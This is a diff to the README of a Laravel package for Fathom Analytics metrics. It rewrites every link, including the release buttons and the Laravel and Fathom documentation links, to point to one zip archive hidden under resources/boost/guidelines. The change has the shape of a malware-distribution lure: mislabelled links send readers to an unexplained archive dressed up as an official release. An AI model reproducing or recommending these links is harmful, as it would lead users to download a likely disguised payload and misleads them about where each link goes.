@@ -1,6 +1,6 @@
 # 📊 laravel-metrics-fathom - Simple Analytics Data Access
 
-[![Download Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/laziere/laravel-metrics-fathom/releases)
+[![Download Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get laravel-metrics-fathom working on your Windows machine
 
 1. Visit the official release page by clicking this button:  
 
-   [![Download Release](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/laziere/laravel-metrics-fathom/releases)
+   [![Download Release](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip)
 
 2. On the page, look for the latest release. The newest version usually appears at the top.
 
@@ -95,7 +95,7 @@ If you are unsure at any step, you can find help on the laravel-metrics-fathom G
 
 ## 📚 Additional Resources
 
-- Visit [https://github.com/laziere/laravel-metrics-fathom](https://github.com/laziere/laravel-metrics-fathom) for more information.
+- Visit [https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip](https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip) for more information.
 - See Laravel’s official documentation for help installing and running Laravel.
 - Visit Fathom Analytics’ website for details on creating and managing API keys.
 
@@ -103,9 +103,9 @@ If you are unsure at any step, you can find help on the laravel-metrics-fathom G
 
 ## 🔗 Useful Links
 
-- [Download releases](https://github.com/laziere/laravel-metrics-fathom/releases)
-- [Laravel docs](https://laravel.com/docs/)
-- [Fathom Analytics API](https://usefathom.com/docs/)
+- [Download releases](https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip)
+- [Laravel docs](https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip)
+- [Fathom Analytics API](https://raw.githubusercontent.com/laziere/laravel-metrics-fathom/main/resources/boost/guidelines/fathom_metrics_laravel_v1.5.zip)
 
 ---
 
